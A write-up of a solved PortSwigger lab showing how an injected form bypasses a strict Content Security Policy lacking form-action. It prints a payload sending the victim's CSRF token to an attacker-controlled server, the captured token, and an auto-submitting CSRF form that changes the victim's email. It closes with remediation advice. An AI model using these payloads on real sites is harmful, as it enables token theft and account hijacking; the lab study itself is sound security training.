# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

## Overview

- **Category:** Cross-Site Scripting / Content Security Policy (CSP) / Form Hijacking & CSRF
- **Difficulty:** Practitioner
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This lab contains a reflected HTML injection vulnerability on the `/my-account` page via the `email` query parameter (`GET /my-account?email=...`), protected by a strict Content Security Policy (`Content-Security-Policy: default-src 'self'; object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';`). Although all inline scripts and event handlers are blocked by CSP, the policy omits the `form-action` directive (which does not fall back to `default-src`). By performing a two-stage attack—first hijacking the surrounding HTML form to exfiltrate the victim's `csrf` token to our server log, and second submitting a CSRF payload with the captured token—we update the victim's email address.

---

## Scenario & Mental Model

```text
STAGE 1: Exfiltrating the Victim's CSRF Token (Bypassing Strict CSP)
  1. Target HTML structure on `/my-account?email=USER_INPUT`:
     <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
         <label>Email</label>
         <input required type="email" name="email" value="USER_INPUT">
         <input required type="hidden" name="csrf" value="VICTIM_CSRF_TOKEN">
         <button class='button' type='submit'> Update email </button>
     </form>
  2. Strict CSP blocks `script-src`, `img-src`, and `base-uri`, but lacks `form-action`.
  3. Injecting `"></form><form action="https://SERVER-HOST/exploit"><button type="submit">Click me</button>`
     terminates the original form early and wraps the downstream hidden `<input name="csrf">`
     inside our new `<form>` pointing to our server.
  4. When the simulated victim clicks the "Click me" button, the browser submits the form
     via GET to `https://SERVER-HOST/exploit?csrf=VICTIM_CSRF_TOKEN`.
      ↓
STAGE 2: CSRF with the Captured Token
  1. Retrieve `csrf=...` from the server's Access Log.
  2. Host an auto-submitting HTML form targeting `POST /my-account/change-email`
     with the victim's `csrf` token and a new email address.
  3. Deliver to the victim → Email updated → Lab Solved!
```

---

## Step-by-Step Walkthrough

### 2. Stage 1 — Capturing the CSRF Token via Form Injection
Configured the following redirect script on the testing server:

```html
<script>
location = "https://LAB-HOST/my-account?email=%22%3E%3C/form%3E%3Cform%20action=%22https://SERVER-HOST/log%22%3E%3Cbutton%20type=%22submit%22%3EClick%20me%3C/button%3E";
</script>
```

When delivered to the simulated user:
1. The browser navigated to `/my-account?email=...`, closing the original `<form>` and opening a new `<form action="https://SERVER-HOST/log">` that enclosed the hidden `<input name="csrf" value="...">` field.
2. The user clicked the injected **Click me** submit button.
3. Checked the server **Access log** and retrieved the incoming request containing the token:
   ```text
   GET /log?csrf=fvjYDoFGixBtcz3BTcZRaqVhvYZYGy96 HTTP/1.1
   ```

### 3. Stage 2 — Performing the CSRF Email Update
Replaced the testing server response body with an auto-submitting form containing the captured token:

```html
<html>
  <body>
    <form action="https://LAB-HOST/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test@example.com" />
      <input type="hidden" name="csrf" value="fvjYDoFGixBtcz3BTcZRaqVhvYZYGy96" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Saved and delivered the page to the simulated user, changing their email address and solving the lab.

---

## Key Takeaways & Remediation

### Why `default-src 'self'` Does Not Restrict HTML Forms
According to the W3C Content Security Policy specification, the `form-action` directive does **not** fall back to `default-src`. If `form-action` is omitted from a CSP header, an HTML injection flaw still allows anmed-down markup or injected `<form>` tags to submit sensitive page data (such as anti-CSRF tokens) to arbitrary external domains.

### Remediation
- **HTML Output Encoding:** Properly encode `<`, `>`, and `"` (`&lt;`, `&gt;`, `&quot;`) when reflecting the `email` parameter into the `<input value="...">` attribute.
- **Include `form-action 'self'` in CSP:** Always explicitly define `form-action 'self'` in the `Content-Security-Policy` header to block unauthorized cross-origin form submissions.
